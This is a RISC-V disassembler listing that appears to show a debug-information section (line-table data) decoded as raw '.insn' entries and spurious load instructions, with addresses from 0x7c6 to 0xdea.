     7c6:	0104                	.insn	2, 0x0104
     7c8:	08097f03          	.insn	4, 0x08097f03
     7cc:	0100                	.insn	2, 0x0100
     7ce:	0200                	.insn	2, 0x0200
     7d0:	0104                	.insn	2, 0x0104
     7d2:	08097f03          	.insn	4, 0x08097f03
     7d6:	0100                	.insn	2, 0x0100
     7d8:	0200                	.insn	2, 0x0200
     7da:	0104                	.insn	2, 0x0104
     7dc:	08097f03          	.insn	4, 0x08097f03
     7e0:	0100                	.insn	2, 0x0100
     7e2:	0200                	.insn	2, 0x0200
     7e4:	0104                	.insn	2, 0x0104
     7e6:	08097f03          	.insn	4, 0x08097f03
     7ea:	0100                	.insn	2, 0x0100
     7ec:	0200                	.insn	2, 0x0200
     7ee:	0104                	.insn	2, 0x0104
     7f0:	08097f03          	.insn	4, 0x08097f03
     7f4:	0100                	.insn	2, 0x0100
     7f6:	0200                	.insn	2, 0x0200
     7f8:	0104                	.insn	2, 0x0104
     7fa:	08097f03          	.insn	4, 0x08097f03
     7fe:	0100                	.insn	2, 0x0100
     800:	0200                	.insn	2, 0x0200
     802:	0104                	.insn	2, 0x0104
     804:	08097f03          	.insn	4, 0x08097f03
     808:	0100                	.insn	2, 0x0100
     80a:	0200                	.insn	2, 0x0200
     80c:	0104                	.insn	2, 0x0104
     80e:	08097f03          	.insn	4, 0x08097f03
     812:	0100                	.insn	2, 0x0100
     814:	0200                	.insn	2, 0x0200
     816:	0104                	.insn	2, 0x0104
     818:	08097f03          	.insn	4, 0x08097f03
     81c:	0100                	.insn	2, 0x0100
     81e:	0200                	.insn	2, 0x0200
     820:	0104                	.insn	2, 0x0104
     822:	08097f03          	.insn	4, 0x08097f03
     826:	0100                	.insn	2, 0x0100
     828:	0200                	.insn	2, 0x0200
     82a:	0104                	.insn	2, 0x0104
     82c:	08097f03          	.insn	4, 0x08097f03
     830:	0100                	.insn	2, 0x0100
     832:	0200                	.insn	2, 0x0200
     834:	0104                	.insn	2, 0x0104
     836:	08097f03          	.insn	4, 0x08097f03
     83a:	0100                	.insn	2, 0x0100
     83c:	1005                	.insn	2, 0x1005
     83e:	0200                	.insn	2, 0x0200
     840:	0304                	.insn	2, 0x0304
     842:	04090003          	lb	zero,64(s2)
     846:	0100                	.insn	2, 0x0100
     848:	0c05                	.insn	2, 0x0c05
     84a:	14090f03          	lb	t5,320(s2)
     84e:	0100                	.insn	2, 0x0100
     850:	0d05                	.insn	2, 0x0d05
     852:	0c090103          	lb	sp,192(s2)
     856:	0100                	.insn	2, 0x0100
     858:	1005                	.insn	2, 0x1005
     85a:	0c096f03          	.insn	4, 0x0c096f03
     85e:	0100                	.insn	2, 0x0100
     860:	0c05                	.insn	2, 0x0c05
     862:	0c091403          	lh	s0,192(s2)
     866:	0100                	.insn	2, 0x0100
     868:	0505                	.insn	2, 0x0505
     86a:	0c090003          	lb	zero,192(s2)
     86e:	0100                	.insn	2, 0x0100
     870:	0905                	.insn	2, 0x0905
     872:	04090103          	lb	sp,64(s2)
     876:	0100                	.insn	2, 0x0100
     878:	2205                	.insn	2, 0x2205
     87a:	0200                	.insn	2, 0x0200
     87c:	0104                	.insn	2, 0x0104
     87e:	04090003          	lb	zero,64(s2)
     882:	0100                	.insn	2, 0x0100
     884:	1f05                	.insn	2, 0x1f05
     886:	0200                	.insn	2, 0x0200
     888:	0104                	.insn	2, 0x0104
     88a:	14090003          	lb	zero,320(s2)
     88e:	0100                	.insn	2, 0x0100
     890:	2005                	.insn	2, 0x2005
     892:	0200                	.insn	2, 0x0200
     894:	0304                	.insn	2, 0x0304
     896:	08097f03          	.insn	4, 0x08097f03
     89a:	0100                	.insn	2, 0x0100
     89c:	1905                	.insn	2, 0x1905
     89e:	0200                	.insn	2, 0x0200
     8a0:	0104                	.insn	2, 0x0104
     8a2:	0c090003          	lb	zero,192(s2)
     8a6:	0100                	.insn	2, 0x0100
     8a8:	0105                	.insn	2, 0x0105
     8aa:	08090303          	lb	t1,128(s2)
     8ae:	0100                	.insn	2, 0x0100
     8b0:	18090303          	lb	t1,384(s2)
     8b4:	0100                	.insn	2, 0x0100
     8b6:	1405                	.insn	2, 0x1405
     8b8:	18090103          	lb	sp,384(s2)
     8bc:	0100                	.insn	2, 0x0100
     8be:	0505                	.insn	2, 0x0505
     8c0:	08090103          	lb	sp,128(s2)
     8c4:	0100                	.insn	2, 0x0100
     8c6:	1b05                	.insn	2, 0x1b05
     8c8:	0200                	.insn	2, 0x0200
     8ca:	0104                	.insn	2, 0x0104
     8cc:	04090003          	lb	zero,64(s2)
     8d0:	0100                	.insn	2, 0x0100
     8d2:	0105                	.insn	2, 0x0105
     8d4:	0c090103          	lb	sp,192(s2)
     8d8:	0100                	.insn	2, 0x0100
     8da:	0204                	.insn	2, 0x0204
     8dc:	3405                	.insn	2, 0x3405
     8de:	14095603          	lhu	a2,320(s2)
     8e2:	0100                	.insn	2, 0x0100
     8e4:	0e05                	.insn	2, 0x0e05
     8e6:	14090303          	lb	t1,320(s2)
     8ea:	0100                	.insn	2, 0x0100
     8ec:	1205                	.insn	2, 0x1205
     8ee:	0c090203          	lb	tp,192(s2)
     8f2:	0100                	.insn	2, 0x0100
     8f4:	0805                	.insn	2, 0x0805
     8f6:	08090003          	lb	zero,128(s2)
     8fa:	0100                	.insn	2, 0x0100
     8fc:	1605                	.insn	2, 0x1605
     8fe:	04090103          	lb	sp,64(s2)
     902:	0100                	.insn	2, 0x0100
     904:	0805                	.insn	2, 0x0805
     906:	0c090303          	lb	t1,192(s2)
     90a:	0100                	.insn	2, 0x0100
     90c:	1605                	.insn	2, 0x1605
     90e:	0c090103          	lb	sp,192(s2)
     912:	0100                	.insn	2, 0x0100
     914:	1d05                	.insn	2, 0x1d05
     916:	08090703          	lb	a4,128(s2)
     91a:	0100                	.insn	2, 0x0100
     91c:	3205                	.insn	2, 0x3205
     91e:	08090003          	lb	zero,128(s2)
     922:	0100                	.insn	2, 0x0100
     924:	0e05                	.insn	2, 0x0e05
     926:	08090003          	lb	zero,128(s2)
     92a:	0100                	.insn	2, 0x0100
     92c:	1305                	.insn	2, 0x1305
     92e:	08090303          	lb	t1,128(s2)
     932:	0100                	.insn	2, 0x0100
     934:	0505                	.insn	2, 0x0505
     936:	04090003          	lb	zero,64(s2)
     93a:	0100                	.insn	2, 0x0100
     93c:	3505                	.insn	2, 0x3505
     93e:	04090203          	lb	tp,64(s2)
     942:	0100                	.insn	2, 0x0100
     944:	4e05                	.insn	2, 0x4e05
     946:	0c090003          	lb	zero,192(s2)
     94a:	0100                	.insn	2, 0x0100
     94c:	1205                	.insn	2, 0x1205
     94e:	08090003          	lb	zero,128(s2)
     952:	0100                	.insn	2, 0x0100
     954:	1605                	.insn	2, 0x1605
     956:	08090303          	lb	t1,128(s2)
     95a:	0100                	.insn	2, 0x0100
     95c:	0905                	.insn	2, 0x0905
     95e:	04090003          	lb	zero,64(s2)
     962:	0100                	.insn	2, 0x0100
     964:	1605                	.insn	2, 0x1605
     966:	04090303          	lb	t1,64(s2)
     96a:	0100                	.insn	2, 0x0100
     96c:	3205                	.insn	2, 0x3205
     96e:	0c090403          	lb	s0,192(s2)
     972:	0100                	.insn	2, 0x0100
     974:	3e05                	.insn	2, 0x3e05
     976:	0c090003          	lb	zero,192(s2)
     97a:	0100                	.insn	2, 0x0100
     97c:	1a05                	.insn	2, 0x1a05
     97e:	08090003          	lb	zero,128(s2)
     982:	0100                	.insn	2, 0x0100
     984:	1805                	.insn	2, 0x1805
     986:	04090003          	lb	zero,64(s2)
     98a:	0100                	.insn	2, 0x0100
     98c:	4205                	.insn	2, 0x4205
     98e:	0200                	.insn	2, 0x0200
     990:	0304                	.insn	2, 0x0304
     992:	08097903          	.insn	4, 0x08097903
     996:	0100                	.insn	2, 0x0100
     998:	1f05                	.insn	2, 0x1f05
     99a:	0200                	.insn	2, 0x0200
     99c:	0104                	.insn	2, 0x0104
     99e:	0c090003          	lb	zero,192(s2)
     9a2:	0100                	.insn	2, 0x0100
     9a4:	2c05                	.insn	2, 0x2c05
     9a6:	0200                	.insn	2, 0x0200
     9a8:	0204                	.insn	2, 0x0204
     9aa:	0c097b03          	.insn	4, 0x0c097b03
     9ae:	0100                	.insn	2, 0x0100
     9b0:	1c05                	.insn	2, 0x1c05
     9b2:	0200                	.insn	2, 0x0200
     9b4:	0104                	.insn	2, 0x0104
     9b6:	0c090003          	lb	zero,192(s2)
     9ba:	0100                	.insn	2, 0x0100
     9bc:	0105                	.insn	2, 0x0105
     9be:	0c091003          	lh	zero,192(s2)
     9c2:	0100                	.insn	2, 0x0100
     9c4:	0304                	.insn	2, 0x0304
     9c6:	097fb203          	.insn	4, 0x097fb203
     9ca:	0014                	.insn	2, 0x0014
     9cc:	0501                	.insn	2, 0x0501
     9ce:	0905030f          	.insn	4, 0x0905030f
     9d2:	0010                	.insn	2, 0x0010
     9d4:	0501                	.insn	2, 0x0501
     9d6:	032d                	.insn	2, 0x032d
     9d8:	0901                	.insn	2, 0x0901
     9da:	0010                	.insn	2, 0x0010
     9dc:	0501                	.insn	2, 0x0501
     9de:	0318                	.insn	2, 0x0318
     9e0:	0900                	.insn	2, 0x0900
     9e2:	000c                	.insn	2, 0x000c
     9e4:	0501                	.insn	2, 0x0501
     9e6:	0305                	.insn	2, 0x0305
     9e8:	0901                	.insn	2, 0x0901
     9ea:	0008                	.insn	2, 0x0008
     9ec:	0501                	.insn	2, 0x0501
     9ee:	030e                	.insn	2, 0x030e
     9f0:	090a                	.insn	2, 0x090a
     9f2:	0034                	.insn	2, 0x0034
     9f4:	0501                	.insn	2, 0x0501
     9f6:	09000323          	sb	a6,134(zero) # 86 <_start-0xf7a>
     9fa:	0008                	.insn	2, 0x0008
     9fc:	0501                	.insn	2, 0x0501
     9fe:	032e                	.insn	2, 0x032e
     a00:	0901                	.insn	2, 0x0901
     a02:	0014                	.insn	2, 0x0014
     a04:	0501                	.insn	2, 0x0501
     a06:	0324                	.insn	2, 0x0324
     a08:	0900                	.insn	2, 0x0900
     a0a:	000c                	.insn	2, 0x000c
     a0c:	0501                	.insn	2, 0x0501
     a0e:	09000333          	.insn	4, 0x09000333
     a12:	0010                	.insn	2, 0x0010
     a14:	0501                	.insn	2, 0x0501
     a16:	0319                	.insn	2, 0x0319
     a18:	0900                	.insn	2, 0x0900
     a1a:	0004                	.insn	2, 0x0004
     a1c:	0501                	.insn	2, 0x0501
     a1e:	030c                	.insn	2, 0x030c
     a20:	0900                	.insn	2, 0x0900
     a22:	0010                	.insn	2, 0x0010
     a24:	0501                	.insn	2, 0x0501
     a26:	0301                	.insn	2, 0x0301
     a28:	0901                	.insn	2, 0x0901
     a2a:	0018                	.insn	2, 0x0018
     a2c:	0501                	.insn	2, 0x0501
     a2e:	09020327          	.insn	4, 0x09020327
     a32:	0010                	.insn	2, 0x0010
     a34:	0501                	.insn	2, 0x0501
     a36:	0902030f          	.insn	4, 0x0902030f
     a3a:	0010                	.insn	2, 0x0010
     a3c:	0501                	.insn	2, 0x0501
     a3e:	0322                	.insn	2, 0x0322
     a40:	0902                	.insn	2, 0x0902
     a42:	0010                	.insn	2, 0x0010
     a44:	0501                	.insn	2, 0x0501
     a46:	0311                	.insn	2, 0x0311
     a48:	0900                	.insn	2, 0x0900
     a4a:	000c                	.insn	2, 0x000c
     a4c:	0501                	.insn	2, 0x0501
     a4e:	0302                	.insn	2, 0x0302
     a50:	0901                	.insn	2, 0x0901
     a52:	0008                	.insn	2, 0x0008
     a54:	0501                	.insn	2, 0x0501
     a56:	0910030b          	.insn	4, 0x0910030b
     a5a:	0034                	.insn	2, 0x0034
     a5c:	0501                	.insn	2, 0x0501
     a5e:	031c                	.insn	2, 0x031c
     a60:	0900                	.insn	2, 0x0900
     a62:	0008                	.insn	2, 0x0008
     a64:	0501                	.insn	2, 0x0501
     a66:	032e                	.insn	2, 0x032e
     a68:	0902                	.insn	2, 0x0902
     a6a:	0014                	.insn	2, 0x0014
     a6c:	0501                	.insn	2, 0x0501
     a6e:	0324                	.insn	2, 0x0324
     a70:	0900                	.insn	2, 0x0900
     a72:	000c                	.insn	2, 0x000c
     a74:	0501                	.insn	2, 0x0501
     a76:	09000333          	.insn	4, 0x09000333
     a7a:	0010                	.insn	2, 0x0010
     a7c:	0501                	.insn	2, 0x0501
     a7e:	0319                	.insn	2, 0x0319
     a80:	0900                	.insn	2, 0x0900
     a82:	0004                	.insn	2, 0x0004
     a84:	0501                	.insn	2, 0x0501
     a86:	030c                	.insn	2, 0x030c
     a88:	0900                	.insn	2, 0x0900
     a8a:	0010                	.insn	2, 0x0010
     a8c:	0501                	.insn	2, 0x0501
     a8e:	0301                	.insn	2, 0x0301
     a90:	0901                	.insn	2, 0x0901
     a92:	0018                	.insn	2, 0x0018
     a94:	0501                	.insn	2, 0x0501
     a96:	09020327          	.insn	4, 0x09020327
     a9a:	0010                	.insn	2, 0x0010
     a9c:	0501                	.insn	2, 0x0501
     a9e:	0902030f          	.insn	4, 0x0902030f
     aa2:	0010                	.insn	2, 0x0010
     aa4:	0501                	.insn	2, 0x0501
     aa6:	0322                	.insn	2, 0x0322
     aa8:	0902                	.insn	2, 0x0902
     aaa:	0010                	.insn	2, 0x0010
     aac:	0501                	.insn	2, 0x0501
     aae:	0311                	.insn	2, 0x0311
     ab0:	0900                	.insn	2, 0x0900
     ab2:	000c                	.insn	2, 0x000c
     ab4:	0501                	.insn	2, 0x0501
     ab6:	0302                	.insn	2, 0x0302
     ab8:	0901                	.insn	2, 0x0901
     aba:	0008                	.insn	2, 0x0008
     abc:	0501                	.insn	2, 0x0501
     abe:	0910030b          	.insn	4, 0x0910030b
     ac2:	0034                	.insn	2, 0x0034
     ac4:	0501                	.insn	2, 0x0501
     ac6:	031c                	.insn	2, 0x031c
     ac8:	0900                	.insn	2, 0x0900
     aca:	0008                	.insn	2, 0x0008
     acc:	0501                	.insn	2, 0x0501
     ace:	032e                	.insn	2, 0x032e
     ad0:	0902                	.insn	2, 0x0902
     ad2:	0014                	.insn	2, 0x0014
     ad4:	0501                	.insn	2, 0x0501
     ad6:	0324                	.insn	2, 0x0324
     ad8:	0900                	.insn	2, 0x0900
     ada:	000c                	.insn	2, 0x000c
     adc:	0501                	.insn	2, 0x0501
     ade:	09000333          	.insn	4, 0x09000333
     ae2:	0010                	.insn	2, 0x0010
     ae4:	0501                	.insn	2, 0x0501
     ae6:	0319                	.insn	2, 0x0319
     ae8:	0900                	.insn	2, 0x0900
     aea:	0004                	.insn	2, 0x0004
     aec:	0501                	.insn	2, 0x0501
     aee:	030c                	.insn	2, 0x030c
     af0:	0900                	.insn	2, 0x0900
     af2:	0010                	.insn	2, 0x0010
     af4:	0501                	.insn	2, 0x0501
     af6:	0301                	.insn	2, 0x0301
     af8:	0901                	.insn	2, 0x0901
     afa:	0018                	.insn	2, 0x0018
     afc:	0501                	.insn	2, 0x0501
     afe:	09020327          	.insn	4, 0x09020327
     b02:	0010                	.insn	2, 0x0010
     b04:	0501                	.insn	2, 0x0501
     b06:	0902030f          	.insn	4, 0x0902030f
     b0a:	0010                	.insn	2, 0x0010
     b0c:	0501                	.insn	2, 0x0501
     b0e:	0322                	.insn	2, 0x0322
     b10:	0902                	.insn	2, 0x0902
     b12:	0010                	.insn	2, 0x0010
     b14:	0501                	.insn	2, 0x0501
     b16:	0311                	.insn	2, 0x0311
     b18:	0900                	.insn	2, 0x0900
     b1a:	000c                	.insn	2, 0x000c
     b1c:	0501                	.insn	2, 0x0501
     b1e:	0302                	.insn	2, 0x0302
     b20:	0901                	.insn	2, 0x0901
     b22:	0008                	.insn	2, 0x0008
     b24:	0501                	.insn	2, 0x0501
     b26:	0910030b          	.insn	4, 0x0910030b
     b2a:	0034                	.insn	2, 0x0034
     b2c:	0501                	.insn	2, 0x0501
     b2e:	031c                	.insn	2, 0x031c
     b30:	0900                	.insn	2, 0x0900
     b32:	0008                	.insn	2, 0x0008
     b34:	0501                	.insn	2, 0x0501
     b36:	032e                	.insn	2, 0x032e
     b38:	0902                	.insn	2, 0x0902
     b3a:	0014                	.insn	2, 0x0014
     b3c:	0501                	.insn	2, 0x0501
     b3e:	0324                	.insn	2, 0x0324
     b40:	0900                	.insn	2, 0x0900
     b42:	000c                	.insn	2, 0x000c
     b44:	0501                	.insn	2, 0x0501
     b46:	09000333          	.insn	4, 0x09000333
     b4a:	0010                	.insn	2, 0x0010
     b4c:	0501                	.insn	2, 0x0501
     b4e:	0319                	.insn	2, 0x0319
     b50:	0900                	.insn	2, 0x0900
     b52:	0004                	.insn	2, 0x0004
     b54:	0501                	.insn	2, 0x0501
     b56:	030c                	.insn	2, 0x030c
     b58:	0900                	.insn	2, 0x0900
     b5a:	0010                	.insn	2, 0x0010
     b5c:	0501                	.insn	2, 0x0501
     b5e:	0301                	.insn	2, 0x0301
     b60:	0901                	.insn	2, 0x0901
     b62:	0018                	.insn	2, 0x0018
     b64:	0501                	.insn	2, 0x0501
     b66:	09020327          	.insn	4, 0x09020327
     b6a:	0010                	.insn	2, 0x0010
     b6c:	0501                	.insn	2, 0x0501
     b6e:	0902030f          	.insn	4, 0x0902030f
     b72:	0010                	.insn	2, 0x0010
     b74:	0501                	.insn	2, 0x0501
     b76:	0322                	.insn	2, 0x0322
     b78:	0902                	.insn	2, 0x0902
     b7a:	0010                	.insn	2, 0x0010
     b7c:	0501                	.insn	2, 0x0501
     b7e:	0311                	.insn	2, 0x0311
     b80:	0900                	.insn	2, 0x0900
     b82:	000c                	.insn	2, 0x000c
     b84:	0501                	.insn	2, 0x0501
     b86:	0302                	.insn	2, 0x0302
     b88:	0901                	.insn	2, 0x0901
     b8a:	0008                	.insn	2, 0x0008
     b8c:	0501                	.insn	2, 0x0501
     b8e:	0910030b          	.insn	4, 0x0910030b
     b92:	0034                	.insn	2, 0x0034
     b94:	0501                	.insn	2, 0x0501
     b96:	031c                	.insn	2, 0x031c
     b98:	0900                	.insn	2, 0x0900
     b9a:	0008                	.insn	2, 0x0008
     b9c:	0501                	.insn	2, 0x0501
     b9e:	032e                	.insn	2, 0x032e
     ba0:	0902                	.insn	2, 0x0902
     ba2:	0014                	.insn	2, 0x0014
     ba4:	0501                	.insn	2, 0x0501
     ba6:	0324                	.insn	2, 0x0324
     ba8:	0900                	.insn	2, 0x0900
     baa:	000c                	.insn	2, 0x000c
     bac:	0501                	.insn	2, 0x0501
     bae:	09000333          	.insn	4, 0x09000333
     bb2:	0010                	.insn	2, 0x0010
     bb4:	0501                	.insn	2, 0x0501
     bb6:	0319                	.insn	2, 0x0319
     bb8:	0900                	.insn	2, 0x0900
     bba:	0004                	.insn	2, 0x0004
     bbc:	0501                	.insn	2, 0x0501
     bbe:	030c                	.insn	2, 0x030c
     bc0:	0900                	.insn	2, 0x0900
     bc2:	0010                	.insn	2, 0x0010
     bc4:	0501                	.insn	2, 0x0501
     bc6:	0301                	.insn	2, 0x0301
     bc8:	0901                	.insn	2, 0x0901
     bca:	0018                	.insn	2, 0x0018
     bcc:	0501                	.insn	2, 0x0501
     bce:	09020327          	.insn	4, 0x09020327
     bd2:	0010                	.insn	2, 0x0010
     bd4:	0501                	.insn	2, 0x0501
     bd6:	0902030f          	.insn	4, 0x0902030f
     bda:	0010                	.insn	2, 0x0010
     bdc:	0501                	.insn	2, 0x0501
     bde:	0322                	.insn	2, 0x0322
     be0:	0902                	.insn	2, 0x0902
     be2:	0010                	.insn	2, 0x0010
     be4:	0501                	.insn	2, 0x0501
     be6:	0311                	.insn	2, 0x0311
     be8:	0900                	.insn	2, 0x0900
     bea:	000c                	.insn	2, 0x000c
     bec:	0501                	.insn	2, 0x0501
     bee:	0302                	.insn	2, 0x0302
     bf0:	0901                	.insn	2, 0x0901
     bf2:	0008                	.insn	2, 0x0008
     bf4:	0501                	.insn	2, 0x0501
     bf6:	0910030b          	.insn	4, 0x0910030b
     bfa:	0034                	.insn	2, 0x0034
     bfc:	0501                	.insn	2, 0x0501
     bfe:	031c                	.insn	2, 0x031c
     c00:	0900                	.insn	2, 0x0900
     c02:	0008                	.insn	2, 0x0008
     c04:	0501                	.insn	2, 0x0501
     c06:	032e                	.insn	2, 0x032e
     c08:	0902                	.insn	2, 0x0902
     c0a:	0014                	.insn	2, 0x0014
     c0c:	0501                	.insn	2, 0x0501
     c0e:	0324                	.insn	2, 0x0324
     c10:	0900                	.insn	2, 0x0900
     c12:	000c                	.insn	2, 0x000c
     c14:	0501                	.insn	2, 0x0501
     c16:	09000333          	.insn	4, 0x09000333
     c1a:	0010                	.insn	2, 0x0010
     c1c:	0501                	.insn	2, 0x0501
     c1e:	0319                	.insn	2, 0x0319
     c20:	0900                	.insn	2, 0x0900
     c22:	0004                	.insn	2, 0x0004
     c24:	0501                	.insn	2, 0x0501
     c26:	030c                	.insn	2, 0x030c
     c28:	0900                	.insn	2, 0x0900
     c2a:	0010                	.insn	2, 0x0010
     c2c:	0501                	.insn	2, 0x0501
     c2e:	0301                	.insn	2, 0x0301
     c30:	0901                	.insn	2, 0x0901
     c32:	0018                	.insn	2, 0x0018
     c34:	0401                	.insn	2, 0x0401
     c36:	0504                	.insn	2, 0x0504
     c38:	0336                	.insn	2, 0x0336
     c3a:	0946                	.insn	2, 0x0946
     c3c:	0010                	.insn	2, 0x0010
     c3e:	0501                	.insn	2, 0x0501
     c40:	0905030b          	.insn	4, 0x0905030b
     c44:	0018                	.insn	2, 0x0018
     c46:	0501                	.insn	2, 0x0501
     c48:	0302                	.insn	2, 0x0302
     c4a:	0900                	.insn	2, 0x0900
     c4c:	0004                	.insn	2, 0x0004
     c4e:	0501                	.insn	2, 0x0501
     c50:	0311                	.insn	2, 0x0311
     c52:	0901                	.insn	2, 0x0901
     c54:	0004                	.insn	2, 0x0004
     c56:	0501                	.insn	2, 0x0501
     c58:	031c                	.insn	2, 0x031c
     c5a:	0900                	.insn	2, 0x0900
     c5c:	0010                	.insn	2, 0x0010
     c5e:	0501                	.insn	2, 0x0501
     c60:	09000327          	.insn	4, 0x09000327
     c64:	0004                	.insn	2, 0x0004
     c66:	0501                	.insn	2, 0x0501
     c68:	0900030b          	.insn	4, 0x0900030b
     c6c:	0004                	.insn	2, 0x0004
     c6e:	0301                	.insn	2, 0x0301
     c70:	0901                	.insn	2, 0x0901
     c72:	0008                	.insn	2, 0x0008
     c74:	0501                	.insn	2, 0x0501
     c76:	0309                	.insn	2, 0x0309
     c78:	0900                	.insn	2, 0x0900
     c7a:	000c                	.insn	2, 0x000c
     c7c:	0501                	.insn	2, 0x0501
     c7e:	031f 0902 0004      	.insn	6, 0x00040902031f
     c84:	0501                	.insn	2, 0x0501
     c86:	0316                	.insn	2, 0x0316
     c88:	0900                	.insn	2, 0x0900
     c8a:	000c                	.insn	2, 0x000c
     c8c:	0501                	.insn	2, 0x0501
     c8e:	0309                	.insn	2, 0x0309
     c90:	0900                	.insn	2, 0x0900
     c92:	0014                	.insn	2, 0x0014
     c94:	0501                	.insn	2, 0x0501
     c96:	0901030b          	.insn	4, 0x0901030b
     c9a:	0014                	.insn	2, 0x0014
     c9c:	0501                	.insn	2, 0x0501
     c9e:	0308                	.insn	2, 0x0308
     ca0:	0900                	.insn	2, 0x0900
     ca2:	000c                	.insn	2, 0x000c
     ca4:	0501                	.insn	2, 0x0501
     ca6:	0306                	.insn	2, 0x0306
     ca8:	00040903          	lb	s2,0(s0)
     cac:	0501                	.insn	2, 0x0501
     cae:	0901030b          	.insn	4, 0x0901030b
     cb2:	0008                	.insn	2, 0x0008
     cb4:	0501                	.insn	2, 0x0501
     cb6:	0314                	.insn	2, 0x0314
     cb8:	0900                	.insn	2, 0x0900
     cba:	001c                	.insn	2, 0x001c
     cbc:	0501                	.insn	2, 0x0501
     cbe:	002a                	.insn	2, 0x002a
     cc0:	0402                	.insn	2, 0x0402
     cc2:	0302                	.insn	2, 0x0302
     cc4:	00180977          	.insn	4, 0x00180977
     cc8:	0501                	.insn	2, 0x0501
     cca:	0014                	.insn	2, 0x0014
     ccc:	0402                	.insn	2, 0x0402
     cce:	0301                	.insn	2, 0x0301
     cd0:	0900                	.insn	2, 0x0900
     cd2:	000c                	.insn	2, 0x000c
     cd4:	0501                	.insn	2, 0x0501
     cd6:	0309                	.insn	2, 0x0309
     cd8:	000c090f          	.insn	4, 0x000c090f
     cdc:	0501                	.insn	2, 0x0501
     cde:	030d                	.insn	2, 0x030d
     ce0:	0900                	.insn	2, 0x0900
     ce2:	000c                	.insn	2, 0x000c
     ce4:	0501                	.insn	2, 0x0501
     ce6:	030c                	.insn	2, 0x030c
     ce8:	0902                	.insn	2, 0x0902
     cea:	0018                	.insn	2, 0x0018
     cec:	0501                	.insn	2, 0x0501
     cee:	030e                	.insn	2, 0x030e
     cf0:	0901                	.insn	2, 0x0901
     cf2:	0008                	.insn	2, 0x0008
     cf4:	0501                	.insn	2, 0x0501
     cf6:	0310                	.insn	2, 0x0310
     cf8:	0902                	.insn	2, 0x0902
     cfa:	0008                	.insn	2, 0x0008
     cfc:	0501                	.insn	2, 0x0501
     cfe:	0302                	.insn	2, 0x0302
     d00:	0900                	.insn	2, 0x0900
     d02:	0004                	.insn	2, 0x0004
     d04:	0501                	.insn	2, 0x0501
     d06:	030e                	.insn	2, 0x030e
     d08:	0901                	.insn	2, 0x0901
     d0a:	0004                	.insn	2, 0x0004
     d0c:	0501                	.insn	2, 0x0501
     d0e:	031c                	.insn	2, 0x031c
     d10:	0900                	.insn	2, 0x0900
     d12:	0018                	.insn	2, 0x0018
     d14:	0501                	.insn	2, 0x0501
     d16:	0306                	.insn	2, 0x0306
     d18:	0900                	.insn	2, 0x0900
     d1a:	0008                	.insn	2, 0x0008
     d1c:	0501                	.insn	2, 0x0501
     d1e:	030e                	.insn	2, 0x030e
     d20:	0901                	.insn	2, 0x0901
     d22:	0004                	.insn	2, 0x0004
     d24:	0501                	.insn	2, 0x0501
     d26:	0319                	.insn	2, 0x0319
     d28:	0901                	.insn	2, 0x0901
     d2a:	0010                	.insn	2, 0x0010
     d2c:	0501                	.insn	2, 0x0501
     d2e:	0310                	.insn	2, 0x0310
     d30:	0900                	.insn	2, 0x0900
     d32:	0018                	.insn	2, 0x0018
     d34:	0501                	.insn	2, 0x0501
     d36:	0402002f          	.insn	4, 0x0402002f
     d3a:	0302                	.insn	2, 0x0302
     d3c:	097d                	.insn	2, 0x097d
     d3e:	0008                	.insn	2, 0x0008
     d40:	0501                	.insn	2, 0x0501
     d42:	0019                	.insn	2, 0x0019
     d44:	0402                	.insn	2, 0x0402
     d46:	0301                	.insn	2, 0x0301
     d48:	0900                	.insn	2, 0x0900
     d4a:	000c                	.insn	2, 0x000c
     d4c:	0501                	.insn	2, 0x0501
     d4e:	0301                	.insn	2, 0x0301
     d50:	0908                	.insn	2, 0x0908
     d52:	000c                	.insn	2, 0x000c
     d54:	0501                	.insn	2, 0x0501
     d56:	030c                	.insn	2, 0x030c
     d58:	0902                	.insn	2, 0x0902
     d5a:	0018                	.insn	2, 0x0018
     d5c:	0501                	.insn	2, 0x0501
     d5e:	0308                	.insn	2, 0x0308
     d60:	0902                	.insn	2, 0x0902
     d62:	0010                	.insn	2, 0x0010
     d64:	0501                	.insn	2, 0x0501
     d66:	0902032f          	.insn	4, 0x0902032f
     d6a:	000c                	.insn	2, 0x000c
     d6c:	0501                	.insn	2, 0x0501
     d6e:	0900030b          	.insn	4, 0x0900030b
     d72:	0010                	.insn	2, 0x0010
     d74:	0501                	.insn	2, 0x0501
     d76:	030e                	.insn	2, 0x030e
     d78:	0902                	.insn	2, 0x0902
     d7a:	0004                	.insn	2, 0x0004
     d7c:	0501                	.insn	2, 0x0501
     d7e:	0305                	.insn	2, 0x0305
     d80:	0900                	.insn	2, 0x0900
     d82:	0004                	.insn	2, 0x0004
     d84:	0501                	.insn	2, 0x0501
     d86:	09010317          	auipc	t1,0x9010
     d8a:	0004                	.insn	2, 0x0004
     d8c:	0501                	.insn	2, 0x0501
     d8e:	002e                	.insn	2, 0x002e
     d90:	0402                	.insn	2, 0x0402
     d92:	097f0303          	lb	t1,151(t5)
     d96:	0018                	.insn	2, 0x0018
     d98:	0501                	.insn	2, 0x0501
     d9a:	04020017          	auipc	zero,0x4020
     d9e:	0301                	.insn	2, 0x0301
     da0:	0900                	.insn	2, 0x0900
     da2:	000c                	.insn	2, 0x000c
     da4:	0501                	.insn	2, 0x0501
     da6:	0905030b          	.insn	4, 0x0905030b
     daa:	000c                	.insn	2, 0x000c
     dac:	0501                	.insn	2, 0x0501
     dae:	0302                	.insn	2, 0x0302
     db0:	0900                	.insn	2, 0x0900
     db2:	0004                	.insn	2, 0x0004
     db4:	0501                	.insn	2, 0x0501
     db6:	0311                	.insn	2, 0x0311
     db8:	0901                	.insn	2, 0x0901
     dba:	0004                	.insn	2, 0x0004
     dbc:	0501                	.insn	2, 0x0501
     dbe:	0402002b          	.insn	4, 0x0402002b
     dc2:	097f0303          	lb	t1,151(t5)
     dc6:	0018                	.insn	2, 0x0018
     dc8:	0501                	.insn	2, 0x0501
     dca:	0014                	.insn	2, 0x0014
     dcc:	0402                	.insn	2, 0x0402
     dce:	0301                	.insn	2, 0x0301
     dd0:	0900                	.insn	2, 0x0900
     dd2:	000c                	.insn	2, 0x000c
     dd4:	0501                	.insn	2, 0x0501
     dd6:	0305                	.insn	2, 0x0305
     dd8:	0904                	.insn	2, 0x0904
     dda:	000c                	.insn	2, 0x000c
     ddc:	0501                	.insn	2, 0x0501
     dde:	0311                	.insn	2, 0x0311
     de0:	0900                	.insn	2, 0x0900
     de2:	0008                	.insn	2, 0x0008
     de4:	0501                	.insn	2, 0x0501
     de6:	0305                	.insn	2, 0x0305
     de8:	0901                	.insn	2, 0x0901
     dea:	0008                	.insn	2, 0x0008
